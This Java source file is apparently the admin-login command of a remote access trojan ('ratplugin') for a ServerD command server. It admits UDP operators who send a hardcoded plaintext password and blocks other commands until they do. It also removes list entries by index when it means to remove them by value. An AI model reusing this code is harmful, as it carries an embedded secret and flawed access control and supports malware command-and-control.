package me.wpkg.ratplugin.commands;

import com.serverd.client.Client;
import com.serverd.client.ClientManager;
import com.serverd.plugin.Plugin;
import com.serverd.plugin.command.Command;
import com.serverd.plugin.listener.ConnectListener;
import com.serverd.plugin.listener.ExecutionController;
import com.serverd.plugin.listener.UpdateIDListener;

import java.io.IOException;
import java.util.ArrayList;

public class RegisterAdmin extends Command implements UpdateIDListener, ExecutionController, ConnectListener
{
    private final ArrayList<Integer> authorized = new ArrayList<>();

    public RegisterAdmin(Plugin plugin)
    {
        command = "/registeradmin";
        help = "/registeradmin <password> - registers admin in UDP";

        plugin.addUpdateIDListener(this);
        plugin.addExecutionController(this);
        plugin.addConnectListener(this);
    }
    @Override
    public void execute(String[] args, Client client, Plugin plugin) throws IOException
    {
        if (client.getProtocol() == Client.Protocol.UDP)
        {
            if (!String.join(" ",args).equals("wpkgnajlepszywirus1@Qwerty"))
            {
                client.send("[WRONG_PASSWORD]");
                ClientManager.delete(client.getID());
            }
            else
            {
                client.send("[REGISTER_SUCCESS]");
                authorized.add(client.getID());
            }
        }
        else client.send("[REGISTER_ERROR]");
    }

    @Override
    public void updateID(Plugin plugin, int oldid, int newid)
    {
        updateIDInList(authorized,oldid,newid);
    }

    @Override
    public boolean controlCommand(String command, String[] args, Client client, Plugin plugin) throws IOException
    {
        if (authorized.lastIndexOf(client.getID()) == -1 && !command.matches("/registeradmin|/disconnect"))
        {
            client.send("[NOT_AUTHORIZED]");
            return false;
        }
        else return true;
    }

    @Override
    public void onConnect(Plugin plugin, Client client) {}

    @Override
    public void onDisconnect(Plugin plugin, Client client)
    {
        if (authorized.lastIndexOf(client.getID()) != -1)
            authorized.remove(client.getID());
    }
}
